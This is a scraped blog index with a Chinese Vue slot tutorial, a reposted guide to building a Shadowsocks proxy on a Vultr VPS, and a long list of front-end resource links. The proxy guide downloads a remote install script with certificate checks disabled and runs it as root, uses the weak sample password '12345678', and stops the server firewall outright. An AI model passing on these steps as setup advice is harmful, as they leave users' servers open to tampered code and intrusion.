于是就关闭了vue说明文档。 实际上，插槽的概念很简单，下面通过分三部分来讲。这个部分也是按照vue说明文档的顺序来写的。 进入三部分之前，先让还没接触过插槽的同学对什么是插槽有一个简单的概念：插槽，也就是slot，是组件的一块HTML模板，这块模板显示不显示、以及怎样显示由父组件来决定。 实际上，一个slot最核心的两个问题这里就点出来了，是显示不显示和怎样显示。 由于插槽是一块模板，所以，对于任何一个组件，从模板种类的角度来分，其实都可以分为非插槽模板和插槽模板两大类。 非插槽模板指的是html模板，指的是‘div、span、ul、table’这些，非插槽模板的显示与隐藏以及怎样显示由插件自身控制；插槽模板是slot，它是一个空壳子，因为它显示与隐藏以及最后用什么样的html模板显示由父组件控制。但是插槽显示的位置确由子组件自身决定，slot写在组件template的哪块，父组件传过来的模板将来就显示在哪块。 单个插槽 | 默认插槽 | 匿名插槽首先是单个插槽，单个插槽是vue的官方叫法，但是其实也可以叫它默认插槽，或者与具名插槽相对，我们可以叫它匿名插槽。因为它不用设置name属性。 单个插槽可以放置在组件的任意位置，但是就像它的名字一样，一个组件中只能有一个该类插槽。相对应的，具名插槽就可以有很多个，只要名字（name属性）不同就可以了。 下面通过一个例子来展示。 父组件： 123456789101112131415&lt;template&gt; &lt;div class=&quot;father&quot;&gt; &lt;h3&gt;这里是父组件&lt;/h3&gt; &lt;child&gt; &lt;div class=&quot;tmpl&quot;&gt; &lt;span&gt;菜单1&lt;/span&gt; &lt;span&gt;菜单2&lt;/span&gt; &lt;span&gt;菜单3&lt;/span&gt; &lt;span&gt;菜单4&lt;/span&gt; &lt;span&gt;菜单5&lt;/span&gt; &lt;span&gt;菜单6&lt;/span&gt; &lt;/div&gt; &lt;/child&gt; &lt;/div&gt;&lt;/template&gt; 子组件： 123456&lt;template&gt; &lt;div class=&quot;child&quot;&gt; &lt;h3&gt;这里是子组件&lt;/h3&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; 在这个例子里，因为父组件在里面写了html模板，那么子组件的匿名插槽这块模板就是下面这样。也就是说，子组件的匿名插槽被使用了，是被下面这块模板使用了。 12345678&lt;div class=&quot;tmpl&quot;&gt; &lt;span&gt;菜单1&lt;/span&gt; &lt;span&gt;菜单2&lt;/span&gt; &lt;span&gt;菜单3&lt;/span&gt; &lt;span&gt;菜单4&lt;/span&gt; &lt;span&gt;菜单5&lt;/span&gt; &lt;span&gt;菜单6&lt;/span&gt;&lt;/div&gt; 最终的渲染结果如图所示： 1注：所有demo都加了样式，以方便观察。其中，父组件以灰色背景填充，子组件都以浅蓝色填充。 具名插槽匿名插槽没有name属性，所以是匿名插槽，那么，插槽加了name属性，就变成了具名插槽。具名插槽可以在一个组件中出现N次。出现在不同的位置。下面的例子，就是一个有两个具名插槽和单个插槽的组件，这三个插槽被父组件用同一套css样式显示了出来，不同的是内容上略有区别。 父组件： 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class=&quot;father&quot;&gt; &lt;h3&gt;这里是父组件&lt;/h3&gt; &lt;child&gt; &lt;div class=&quot;tmpl&quot; slot=&quot;up&quot;&gt; &lt;span&gt;菜单1&lt;/span&gt; &lt;span&gt;菜单2&lt;/span&gt; &lt;span&gt;菜单3&lt;/span&gt; &lt;span&gt;菜单4&lt;/span&gt; &lt;span&gt;菜单5&lt;/span&gt; &lt;span&gt;菜单6&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;tmpl&quot; slot=&quot;down&quot;&gt; &lt;span&gt;菜单-1&lt;/span&gt; &lt;span&gt;菜单-2&lt;/span&gt; &lt;span&gt;菜单-3&lt;/span&gt; &lt;span&gt;菜单-4&lt;/span&gt; &lt;span&gt;菜单-5&lt;/span&gt; &lt;span&gt;菜单-6&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;tmpl&quot;&gt; &lt;span&gt;菜单-&gt;1&lt;/span&gt; &lt;span&gt;菜单-&gt;2&lt;/span&gt; &lt;span&gt;菜单-&gt;3&lt;/span&gt; &lt;span&gt;菜单-&gt;4&lt;/span&gt; &lt;span&gt;菜单-&gt;5&lt;/span&gt; &lt;span&gt;菜单-&gt;6&lt;/span&gt; &lt;/div&gt; &lt;/child&gt; &lt;/div&gt;&lt;/template&gt; 子组件： 1234567891011&lt;template&gt; &lt;div class=&quot;child&quot;&gt; // 具名插槽 &lt;slot name=&quot;up&quot;&gt;&lt;/slot&gt; &lt;h3&gt;这里是子组件&lt;/h3&gt; // 具名插槽 &lt;slot name=&quot;down&quot;&gt;&lt;/slot&gt; // 匿名插槽 &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; 显示结果如图： 可以看到，父组件通过html模板上的slot属性关联具名插槽。没有slot属性的html模板默认关联匿名插槽。 作用域插槽 | 带数据的插槽最后，就是我们的作用域插槽。这个稍微难理解一点。官方叫它作用域插槽，实际上，对比前面两种插槽，我们可以叫它带数据的插槽。什么意思呢，就是前面两种，都是在组件的template里面写 1234匿名插槽&lt;slot&gt;&lt;/slot&gt;具名插槽&lt;slot name=&quot;up&quot;&gt;&lt;/slot&gt; 但是作用域插槽要求，在slot上面绑定数据。也就是你得写成大概下面这个样子。 12345678&lt;slot name=&quot;up&quot; :data=&quot;data&quot;&gt;&lt;/slot&gt; export default &#123; data: function()&#123; return &#123; data: [&apos;zhangsan&apos;,&apos;lisi&apos;,&apos;wanwu&apos;,&apos;zhaoliu&apos;,&apos;tianqi&apos;,&apos;xiaoba&apos;] &#125; &#125;,&#125; 我们前面说了，插槽最后显示不显示是看父组件有没有在child下面写模板，像下面那样。 123&lt;child&gt; html模板&lt;/child&gt; 写了，插槽就总得在浏览器上显示点东西，东西就是html该有的模样，没写，插槽就是空壳子，啥都没有。 OK，我们说有html模板的情况，就是父组件会往子组件插模板的情况，那到底插一套什么样的样式呢，这由父组件的html+css共同决定，但是这套样式里面的内容呢？ 正因为作用域插槽绑定了一套数据，父组件可以拿来用。于是，情况就变成了这样：样式父组件说了算，但内容可以显示子组件插槽绑定的。 我们再来对比，作用域插槽和单个插槽和具名插槽的区别，因为单个插槽和具名插槽不绑定数据，所以父组件是提供的模板要既包括样式又包括内容的，上面的例子中，你看到的文字，“菜单1”，“菜单2”都是父组件自己提供的内容；而作用域插槽，父组件只需要提供一套样式（在确实用作用域插槽绑定的数据的前提下）。 下面的例子，你就能看到，父组件提供了三种样式，都没有提供数据，数据使用的都是子组件插槽自己绑定的那个人名数组。 父组件： 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div class=&quot;father&quot;&gt; &lt;h3&gt;这里是父组件&lt;/h3&gt; &lt;!--第一次使用：用flex展示数据--&gt; &lt;child&gt; &lt;template slot-scope=&quot;user&quot;&gt; &lt;div class=&quot;tmpl&quot;&gt; &lt;span v-for=&quot;item in user.data&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;/template&gt; &lt;/child&gt; &lt;!--第二次使用：用列表展示数据--&gt; &lt;child&gt; &lt;template slot-scope=&quot;user&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;item in user.data&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;/template&gt; &lt;/child&gt; &lt;!--第三次使用：直接显示数据--&gt; &lt;child&gt; &lt;template slot-scope=&quot;user&quot;&gt; &#123;&#123;user.data&#125;&#125; &lt;/template&gt; &lt;/child&gt; &lt;!--第四次使用：不使用其提供的数据, 作用域插槽退变成匿名插槽--&gt; &lt;child&gt; 我就是模板 &lt;/child&gt; &lt;/div&gt;&lt;/template&gt; 子组件： 12345678910111213141516&lt;template&gt; &lt;div class=&quot;child&quot;&gt; &lt;h3&gt;这里是子组件&lt;/h3&gt; // 作用域插槽 &lt;slot :data=&quot;data&quot;&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; export default &#123; data: function()&#123; return &#123; data: [&apos;zhangsan&apos;,&apos;lisi&apos;,&apos;wanwu&apos;,&apos;zhaoliu&apos;,&apos;tianqi&apos;,&apos;xiaoba&apos;] &#125; &#125;&#125; 结果如图所示： ​ 文章转载于：SegmentFault","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"//www.shen.ee/tags/Vue/"},{"name":"slot","slug":"slot","permalink":"//www.shen.ee/tags/slot/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Vultr VPS搭建SS教程","slug":"Vultr VPS搭建SS教程","date":"2018-03-03T02:38:39.000Z","updated":"2021-11-15T07:55:36.538Z","comments":true,"path":"article/45273.html","link":"","permalink":"//www.shen.ee/article/45273.html","excerpt":"","text":"Vultr VPS搭建SS教程 此篇文章仅用于学习交流使用，请勿用于商业及非法用途 国外服务器的购买这里我选择的是Vultr，对比了很多国外的服务器，这个蛮靠谱的，且搭建成功后看youtube1080p完全无压力。 这里是链接：Vultr The Infrastructure Cloud™ 当然，已经有服务器的小伙伴，直接从==快速搭建ShadowSocks==开始看 Vultr服务器价格Vultr服务器按小时计费,最低0.004美元/h,算起来2.5美元/月，且destory掉服务器是不收费的，所以不用担心如果暂时没有使用还一直扣费的问题，如下图所示： 最低价格的服务器是512M的内存，500G的带宽，只能说99%的情况下完全够用了！ 注册Vultr首先打开Vultr链接，点击Create Account，如下图 因为Vultr的网站是全英文的，对注册还是有要求的，密码的规范如下图所示： 充值Vultr注册完成之后就是充值，Vultr提供4种充值方式，如下图： 这里我选择支付宝，因为方便快捷，但是最低消费10美元，也不多，60多人民币，如下图： 付款之后，就可以看到账户的钱多了 选择VPS的位置首先，位置很重要！我们如何选择呢，当然有科学的办法，ping它！ Vultr的服务器有很多位置，下面我测试的东京节点和新加坡节点的数据如下： 这么看来还是东京的节点速度比较好，当然这个因人而异，在中国不同的地理位置访问国外不同位置的服务器速度也不一样。（下面提供了下载地址,下载下来双击运行即可）。 测速脚本下载地址：点我下载 测速.bat 脚本内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@echo offecho ===========================================echo 东京ping hnd-jp-ping.vultr.comecho ============================================echo 新加坡ping sgp-ping.vultr.comecho ===========================================echo (AU) Sydney, Australia[悉尼]ping syd-au-ping.vultr.comecho ===========================================echo 德国 法兰克福ping fra-de-ping.vultr.comecho ===========================================echo 荷兰 阿姆斯特丹ping ams-nl-ping.vultr.comecho ===========================================echo 英国 伦敦ping lon-gb-ping.vultr.comecho ===========================================echo 法国 巴黎ping par-fr-ping.vultr.comecho ===========================================echo 美东 华盛顿州 西雅图ping wa-us-ping.vultr.comecho ===========================================echo 美西 加州 硅谷ping sjo-ca-us-ping.vultr.comecho ===========================================echo 美西 加州 洛杉矶ping lax-ca-us-ping.vultr.comecho ===========================================echo 美东 芝加哥Chicago, Illinois[美东 芝加哥]ping il-us-ping.vultr.comecho ===========================================echo 美中 德克萨斯州 达拉斯ping tx-us-ping.vultr.comecho ===========================================echo 美东 新泽西ping nj-us-ping.vultr.comecho ===========================================echo 美东 乔治亚州 亚特兰大ping ga-us-ping.vultr.comecho ===========================================echo 美东 佛罗里达州 迈阿密ping fl-us-ping.vultr.com pause 根据测速的结果，我选择东京位置的VPS 创建VPS左侧菜单栏Servers，点击+，如下图： 选择VPS的位置，如下图： 选择操作系统和价格，如下图： 点击最下面的Deploy Now，如下图： 创建成功 VPS的信息安装成功之后，点击Manage 可以看到你购买的VPS的信息，如下图所示： ping一下ip地址，100ms多一点，这个速度相当可以了，如下图： VPS的使用下载Shell当然是选择先连接它了，我们选择的工具是XShell 下载地址：Xshell下载 下载完成之后安装，下一步即可 接着选择免费为家庭/学校 语言选择中文： 安装成功后打开 连接VPS打开Xshell，选择文件-&gt;新建，输入VPS的IP，IP地址就在Vultr的管理页面上，如下图所示： 点击确定，输入用户名，默认应该为root，如下图： 接着输入密码： 连接成功： 快速搭建ShadowSocks(二选一)一键安装使用方法在Xshell中依次运行以下命令 12345wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 接着按照提醒输入你的密码，端口和加密方式，如下图： 然后可以去听首歌~，成功安装之后有你配置的信息显示，记住这些信息，然后跳过下面的手动安装部分，直接去看客户端连接部分即可，如下图： image 以上脚本来源于秋水逸冰 手动安装安装依赖包在XShell的控制台输入： 12curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;python get-pip.py 一个个的来，如下图： 安装ShadowSocks12pip install --upgrade pippip install shadowsocks 如下图： 创建ShadowSocks配置文件单端口1vi /etc/shadowsocks.json 输入以下内容，然后点ESC后输入:wq保存退出 123456&#123; &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;server_port&quot;: 2018, &quot;password&quot;: &quot;12345678&quot;, &quot;method&quot;: &quot;aes-256-cfb&quot;&#125; 多端口（可选，配置了单端口就不要配置这个）多端口的配置文件如下： 1234567891011&#123; &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;port_password&quot;: &#123; &quot;8381&quot;: &quot;password1&quot;, &quot;8382&quot;: &quot;password2&quot;, &quot;8383&quot;: &quot;password3&quot;, &quot;8384&quot;: &quot;password4&quot; &#125;, &quot;timeout&quot;: 300, &quot;method&quot;: &quot;aes-256-cfb&quot;&#125; 我采取的是单端口配置，如下图所示： 配置防火墙1systemctl stop firewalld.service 启动ShadowSocks服务1ssserver -c /etc/shadowsocks.json -d start 如图所示： 下面的是关闭，启动成功之后不要执行 关闭ShadowSocks服务1ssserver -c /etc/shadowsocks.json -d stop 连接ShadowSocks，体会科学上网的魅力Windows客户端下载地址：Shadowsocks-4.0.7.zip 下载完成之后解压打开，如下图所示： 按照你自己的配置完成之后，点击确定，然后在托盘中右键这个小飞机，启动系统代理，灰色的小飞机就会亮起来，如下图： 然后就可以畅游网络了~ 测试地址： 谷歌 Youtube 推特 安卓连接下载地址：shadowsocks.apk 配置和windows差不多，配置完成后点击右上角的开启按钮即可，如下图： IOS连接参考链接：https://www.360doc.com/content/17/0614/06/37032448_662846097.shtml MAC 连接下载地址：ShadowsocksX-2.6.3.dmg 测试结果4K Youtube完成无压力 来源：https://www.jianshu.com/p/1c82ee1293a4","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"最全前端资源汇集","slug":"最全前端资源汇集","date":"2018-02-11T07:02:10.000Z","updated":"2021-11-15T07:55:36.547Z","comments":true,"path":"article/62209.html","link":"","permalink":"//www.shen.ee/article/62209.html","excerpt":"","text":"综合类 综合类 地址 前端知识体系 http://www.cnblogs.com/sb19871023/p/3894452.html 前端知识结构 https://github.com/JacksonTian/fks Web前端开发大系概览 https://github.com/unruledboy/WebFrontEndStack Web前端开发大系概览-中文版 http://www.cnblogs.com/unruledboy/p/WebFrontEndStack.html Web Front-end Stack v2.2 Web Front-end Stack v2.2 免费的编程中文书籍索引 https://github.com/justjavac/free-programming-books-zh_CN 前端书籍 https://github.com/dypsilon/frontend-dev-bookmarks 前端免费书籍大全 https://github.com/vhf/free-programming-books 前端知识体系 http://www.cnblogs.com/sb19871023/p/3894452.html 免费的编程中文书籍索引 https://github.com/justjavac/free-programming-books-zh_CN 智能社 - 精通JavaScript开发 http://study.163.com/course/introduction/224014.htm 重新介绍 JavaScript（JS 教程） https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript 麻省理工学院公开课：计算机科学及编程导论 http://v.163.com/special/opencourse/bianchengdaolun.html JavaScript中的this陷阱的最全收集–没有之一 http://segmentfault.com/a/1190000002640298 JS函数式编程指南 https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html JavaScript Promise迷你书（中文版） http://liubin.github.io/promises-book 腾讯移动Web前端知识库 https://github.com/AlloyTeam/Mars Front-End-Develop-Guide 前端开发指南 https://github.com/Front-End-Developers-Hunan/Front-End-Develop-Guide 前端开发笔记本 https://li-xinyang.gitbooks.io/frontend-notebook/content 大前端工具集 - 聂微东 https://github.com/nieweidong/fetool 前端开发者手册 https://dwqs.gitbooks.io/frontenddevhandbook/content 入门类 入门类 地址 前端入门教程 http://www.cnblogs.com/jikey/p/3613082.html 瘳雪峰的Javascript教程 http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000 前端工程师必备的PS技能——切图篇 http://www.imooc.com/view/506 结合个人经历总结的前端入门方法 https://github.com/qiu-deqing/FE-learning 工具类 工具类 地址 前端人的俱乐部 http://f2er.club/ 真可以解放你的收藏夹 如何优雅地使用Sublime Text http://www.jeffjade.com/2015/12/15/2015-04-17-toss-sublime-text/# 新编码神器Atom使用纪要 http://www.jeffjade.com/2016/03/03/2016-03-02-how-to-use-atom/ css sprite 雪碧图制作 http://www.imooc.com/learn/93 版本控制入门 – 搬进 Github http://www.imooc.com/learn/390 Grunt-beginner前端自动化工具 http://www.imooc.com/learn/30 IntelliJ IDEA 简体中文专题教程 https://github.com/judasn/IntelliJ-IDEA-Tutorial SublimeText https://github.com/jikeytang/sublime-text Atom https://atom.io visual studio code https://code.visualstudio.com 综合效果搜索平台 综合效果搜索平台 地址 JavaScript 资源大全中文版 https://github.com/jobbole/awesome-javascript-cn 100+ 超全的web开发工具和资源 https://xituqu.com/170.html 设计师网址导航 http://hao.uisdc.com/ Web前端导航(Alloyteam) http://www.alloyteam.com/nav/ 快搜 http://so.chongbuluo.com/ 阿里iconfont http://www.iconfont.cn/ zoommyapp.com http://zoommyapp.com/ 高质量图库 unsplash.com https://unsplash.com/ 高质量图库 www.pinterest.com https://www.pinterest.com/ 图库 New Old Stock http://nos.twnsnd.co 复古风图库 500px.com https://500px.com/ 唯美照片 效果网 http://www.jq22.com 花瓣网 http://huaban.com/ 优美图 http://www.topit.me/ codepen http://codepen.io/ 摄图网 http://699pic.com/ 常用的JavaScript代码片段 http://microjs.com 团队Blog 团队Blog-Name 地址 腾讯ISUX http://isux.tencent.com 奇舞周刊 http://old.75team.com/weekly/ 淘宝前端团队（FED） http://taobaofed.org 码农周刊 http://weekly.manong.io 凹凸实验室 https://aotu.io/ WEB前端开发 http://www.css88.com A JS tip per day! http://www.jstips.co 腾讯全端 AlloyTeam http://www.alloyteam.com/webdevelop/ 阿里巴巴-U一点 http://www.aliued.cn 百度WEB前端研发部 http://fex.baidu.com 携程设计委员会 http://ued.ctrip.com/blog/ 平安科技移动开发二队技术周报 https://github.com/PaicHyperionDev/MobileDevWeekly 开发中心 开发中心 地址 mozilla js参考 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript chrome开发中心（chrome的内核已转向blink） https://developer.chrome.com/extensions/api_index.html safari开发中心 https://developer.apple.com/library/safari/navigation microsoft js参考 https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94.aspx js秘密花园 http://sanshi.me/articles/JavaScript-Garden-CN/html/index.html js秘密花园 http://bonsaiden.github.io/JavaScript-Garden/zh w3help http://www.w3help.org 综合Bug集合网站 Nodejs Nodejs 地址 Node.js 包教不包会 https://github.com/alsotang/node-lessons 一个nodejs博客 http://60sky.com 【NodeJS 学习笔记04】新闻发布系统 http://www.cnblogs.com/yexiaochai/p/3536547.html 过年7天乐，学nodejs 也快乐 http://www.cnblogs.com/qqloving/p/3541099.html 七天学会NodeJS https://github.com/nqdeng/7-days-nodejs Nodejs学习笔记（二）— 事件模块 http://www.cnblogs.com/zhongweiv/p/nodejs_events.html nodejs入门 http://www.cnblogs.com/liusuqi/p/3735491.html angularjs nodejs https://github.com/zensh/jsgen 从零开始nodejs系列文章 http://blog.fens.me/series-nodejs 理解nodejs http://debuggable.com/posts/understanding-node-js:4bd98440-45e4-4a9a-8ef7-0f7ecbdd56cb nodejs事件轮询 http://blog.mixu.net/2011/02/01/understanding-the-node-js-event-loop node入门 http://www.nodebeginner.org/index-zh-cn.html nodejs cms http://ourjs.com/detail/53e1f281c5910a9806000001 Node初学者入门，一本全面的NodeJS教程 http://ourjs.com/detail/529ca5950cb6498814000005 NodeJS的代码调试和性能调优 http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line 综合API 综合API 地址 OverAPI.com http://overapi.com/ javascripting http://www.javascripting.com 各种流行库搜索 http://microjs.com runoob.com-包含各种API集合 http://www.runoob.com 开源中国在线API文档合集 http://tool.oschina.net/apidocs devdocs http://devdocs.io 英文综合API网站 Ecmascript Ecmascript 地址 Understanding ECMAScript 6 - Nicholas C. Zakas https://leanpub.com/understandinges6/read exploring-es6 https://leanpub.com/exploring-es6/read exploring-es6翻译 https://github.com/es6-org/exploring-es6 exploring-es6翻译后预览 http://es6-org.github.io/exploring-es6 阮一峰 es6 http://es6.ruanyifeng.com 阮一峰 Javascript http://javascript.ruanyifeng.com ECMA-262，第 5 版 http://yanhaijing.com/es5 es5 http://es5.github.io Vue Vue.js 地址 Vue2.0 https://vuefe.cn/ Vue http://cn.vuejs.org Vue Router https://router.vuejs.org/ Vuex https://vuex.vuejs.org/ Vue-Cli https://github.com/vuejs/vue-cli Vue 论坛 http://forum.vuejs.org Vue 聊天室 https://gitter.im/vuejs/vue Vue 入门指南 http://www.cnblogs.com/aaronjs/p/3660102.html Vue 的一些资源索引 http://segmentfault.com/a/1190000000411057 awesome-vue https://github.com/vuejs/awesome-vue vue-syntax-highlight https://github.com/vuejs/vue-syntax-highlight 如何写一手漂亮的 Vue https://jeffjade.com/2017/03/11/120-how-to-write-vue-better/?me Angularjs Angularjs 地址 Angular.js 的一些学习资源 https://github.com/dolymood/AngularLearning angularjs中文社区 http://angularjs.cn Angularjs源码学习 http://www.cnblogs.com/xuwenmin888/p/3739096.html Angularjs源码学习 http://www.ifeenan.com/?c=AngularJS angular对bootstrap的封装 http://angular-ui.github.io/bootstrap angularjs + nodejs https://cnodejs.org/topic/51404e0f069911196d2e3923 吕大豹 Angularjs http://www.cnblogs.com/lvdabao/tag/AngularJs AngularJS 最佳实践 http://www.infoq.com/cn/news/2013/02/angular-web-app Angular的一些扩展指令 http://www.lovelucy.info/angularjs-best-practices.html Angular数据绑定原理 https://github.com/Pasvaz/bindonce 一些扩展Angular UI组件 https://github.com/angular-ui Ember和AngularJS的性能测试 http://voidcanvas.com/emberjs-vs-angularjs-performance-testing 带你走近AngularJS - 基本功能介绍 http://www.cnblogs.com/powertoolsteam/p/angularjs-introdection.html Angularjs开发指南 http://angular.duapp.com/docs/guide Angularjs学习 http://www.cnblogs.com/amosli/p/3710648.html 不要带着jQuery的思维去学习AngularJS http://www.rainweb.cn/article/angularjs-jquery.html angularjs 学习笔记 http://wangjiatao.diandian.com/?tag=angularjs angularjs 开发指南 http://www.angularjs.cn/T008 angularjs 英文资料 https://github.com/jmcunningham/AngularJS-Learning angular bootstrap http://angular-ui.github.io/bootstrap angular jq mobile https://github.com/opitzconsulting/jquery-mobile-angular-adapter angular ui http://mgcrea.github.io/angular-strap 整合jQuery Mobile+AngularJS经验谈 http://www.tuicool.com/articles/7ZZVr2 有jQuery背景，该如何用AngularJS编程思想 http://blog.jobbole.com/46589/ AngularJS在线教程 http://each.sinaapp.com/angular angular学习笔记 http://www.zouyesheng.com/angular.html React React 地址 react.js 中文论坛 http://www.react-china.org react.js 官方网址 https://facebook.github.io/react/index.html react.js 官方文档 https://facebook.github.io/react/docs/getting-started.html react.js material UI http://material-ui.com/# react.js TouchstoneJS UI http://touchstonejs.io react.js amazeui UI http://amazeui.org/react React 入门实例教程 - 阮一峰 http://www.ruanyifeng.com/blog/2015/03/react.html React Native 中文版 http://wiki.jikexueyuan.com/project/react-native Webpack 和 React 小书 - 前端乱炖 http://www.html-js.com/article/Fakefish%203053 Webpack 和 React 小书 - gitbook https://fakefish.github.io/react-webpack-cookbook webpack https://github.com/webpack/webpack Webpack，101入门体验 http://html-js.com/article/3009 webpack入门教程 http://html-js.com/article/3113 基于webpack搭建前端工程解决方案探索 http://segmentfault.com/a/1190000003499526 Webpack Webpack 地址 Webpack 官网 https://webpack.js.org/ Webpack 中文网 https://doc.webpack-china.org/ webpack-demos（阮一峰） https://github.com/ruanyf/webpack-demos Webpack Tutorial https://www.ag-grid.com/ag-grid-understanding-webpack/ webpack 入门指南 http://www.cnblogs.com/vajoy/p/4650467.html Webpack 打包优化之体积篇 https://jeffjade.com/2017/08/06/124-webpack-packge-optimization-for-volume/ Webpack 打包优化之速度篇 https://jeffjade.com/2017/08/12/125-webpack-package-optimization-for-speed/ Gulp Gulp 地址 Gulp官网 http://gulpjs.com Gulp中文网 http://www.gulpjs.com.cn gulp资料收集 https://github.com/Platform-CUF/use-gulp Gulp：任务自动管理工具 - ruanyifeng http://javascript.ruanyifeng.com/tool/gulp.html Gulp插件 http://gulpjs.com/plugins Gulp探究折腾之路(I) http://www.jeffjade.com/2015/11/25/2015-11-25-toss-gulp/ Gulp折腾之路(II) http://www.jeffjade.com/2016/01/19/2016-01-19-toss-gulp/ Gulp不完全入门教程 http://www.ido321.com/1622.html 为什么使用gulp? https://github.com/hjzheng/CUF_meeting_knowledge_share/issues/33 Gulp安装及配合组件构建前端开发一体化 http://www.dbpoo.com/getting-started-with-gulp Gulp 入门指南 https://github.com/nimojs/gulp-book Gulp 入门指南 - nimojs https://github.com/nimojs/blog/issues/19 Gulp in Action http://www.imooc.com/video/5692 Gulp开发教程（翻译） http://www.w3ctech.com/topic/134 前端构建工具gulpjs的使用介绍及技巧 http://www.cnblogs.com/2050/p/4198792.html Js template Js template 地址 template-chooser http://garann.github.io/template-chooser artTemplate https://github.com/aui/artTemplate tomdjs https://github.com/aui/tmodjs/blob/master/README.md Fxtpl v1.0 繁星前端模板引擎 http://koen301.github.io/fxtpl laytpl http://laytpl.layui.com mozilla - nunjucks https://github.com/mozilla/nunjucks Juicer https://github.com/PaulGuo/Juicer dustjs http://akdubya.github.io/dustjs etpl http://ecomfe.github.io/etpl HTML5(HTML) HTML(HTML5) 地址 深入理解HTML5标签 https://segmentfault.com/a/1190000002695791 如何写出高效率的HTML https://segmentfault.com/a/1190000002680822 HTML meta标签总结与属性使用介绍 https://segmentfault.com/a/1190000004279791 戏说HTML5 http://www.cnblogs.com/dojo-lzz/p/5059316.html CSS3(CSS) CSS 地址 CSS 语法参考 http://tympanus.net/codrops/css_reference 如何编写可维护的CSS https://github.com/chadluo/CSS-Guidelines/blob/master/README.md CSS3动画手册 http://isux.tencent.com/css3/index.html 腾讯css3动画制作工具 http://isux.tencent.com/css3/tools.html 志爷css小工具集合 http://linxz.github.io/tianyizone css3 js 移动大杂烩 http://www.note12.com/category/blog/2014-6-5/538fe0a9f786f1b7019a4dfb bouncejs 触摸库 http://bouncejs.com animate.css http://daneden.github.io/animate.css 全局CSS的终结(狗带 [译] http://www.alloyteam.com/2015/10/8536 browserhacks http://browserhacks.com 移动端API 移动端API 地址 99移动端知识集合 https://github.com/jtyjty99999/mobileTech 移动端前端开发知识库 https://github.com/AlloyTeam/Mars 移动前端的一些坑和解决方法（外观表现） http://caibaojian.com/mobile-web-bug.html 【原】移动web资源整理 http://www.cnblogs.com/PeunZhang/p/3407453.html zepto 1.0 中文手册 http://www.html-5.cn/Manual/Zepto zepto 1.1.2 http://www.css88.com/doc/zeptojs_api zepto 中文注释 http://www.cnblogs.com/sky000/archive/2013/03/29/2988952.html jqmobile 手册 http://app-framework-software.intel.com/api.php 移动浏览器开发集合 https://github.com/maxzhang/maxzhang.github.com/issues 移动开发大杂烩 https://github.com/hoosin/mobile-web-favorites jQuery jQuery 地址 YOU MIGHT NOT NEED JQUERY http://youmightnotneedjquery.com/ jQuery API 中文文档 http://www.jquery123.com hemin 在线版 http://hemin.cn/jq css88 jq api http://www.css88.com/jqapi-1.9/on css88 jqui api http://www.css88.com/jquery-ui-api 学习jquery http://learn.jquery.com jquery 源码查找 http://james.padolsey.com/jquery Web前端资源汇总(jQuery,Js,Css3等) http://www.cnblogs.com/jihua/p/webfront.html D3 D3 地址 d3 Tutorials https://github.com/mbostock/d3/wiki/Tutorials Gallery https://github.com/mbostock/d3/wiki/Gallery lofter http://datavisual.lofter.com/post/40cf3a_188e535 iteye http://alanland.iteye.com/blog/1878595 ruanyifeng http://javascript.ruanyifeng.com/library/d3.html Requriejs Requriejs 地址 Javascript模块化编程（一）：模块的写法 http://www.ruanyifeng.com/blog/2012/10/javascript_module.html Javascript模块化编程（二）：AMD规范 http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html Javascript模块化编程（三）：require.js的用法 http://www.ruanyifeng.com/blog/2012/11/require_js.html RequireJS入门（一） http://www.cnblogs.com/snandy/archive/2012/05/22/2513652.html RequireJS入门（二） http://www.cnblogs.com/snandy/archive/2012/05/23/2513712.html RequireJS进阶（三） http://www.cnblogs.com/snandy/archive/2012/06/08/2538001.html requrie源码学习 http://www.cnblogs.com/yexiaochai/p/3632580.html requrie 入门指南 http://www.oschina.net/translate/getting-started-with-the-requirejs-library requrieJS 学习笔记 http://www.cnblogs.com/yexiaochai/p/3214926.html requriejs 其一 http://cyj.me/why-seajs/requirejs/ require backbone结合 http://www.cnblogs.com/yexiaochai/p/3221081.html Seajs Seajs 地址 seajs http://seajs.org seajs 中文手册 http://cyj.me/why-seajs/zh Less,sass Less,sass 地址 sass http://www.w3cplus.com/sassguide sass教程-sass中国 http://www.sass.hk Sass 中文文档 http://sass.bootcss.com less http://less.bootcss.com Markdown Markdown 地址 Markdown 语法说明 (简体中文版 http://wowubuntu.com/markdown markdown入门参考 https://github.com/LearnShare/Learning-Markdown/blob/master/README.md gitbook https://www.gitbook.com 国外的在线markdown可编辑成书 mdeditor https://www.zybuluo.com/mdeditor 